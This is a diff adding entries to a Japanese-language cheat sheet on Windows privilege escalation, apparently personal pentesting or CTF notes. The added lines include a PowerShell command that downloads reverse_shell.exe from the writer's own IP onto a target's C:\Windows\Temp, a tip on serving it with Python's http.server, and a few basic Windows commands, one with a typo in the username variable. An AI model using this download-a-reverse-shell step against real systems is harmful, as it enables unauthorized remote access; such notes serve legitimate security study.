@@ -1,5 +1,16 @@
 # Windows権限昇格手法  
 
+### 簡易ファイルサーバーからファイルをダウンロードする  
+``` powershell -c "Invoke-WebRequest -Uri 'http://<自分のIP>:8000/reverse_shell.exe' -OutFile 'C:\Windows\Temp\reverse_shell.exe'" ```  
+ちなみにpython3側では``` python3 -m http.server ```で簡易うｐ鯖を建てられる(デフォルトでポートは8000)  
+
+
+### よく使うWindowsコマンド一覧  
+現在のユーザーネームを表示
+``` echo %usernamem% ```
+
+ファイル名を変更する  
+``` ren 元のファイル名　先のファイル名 ```
 
 ### PowerShellのログを確認する  
 
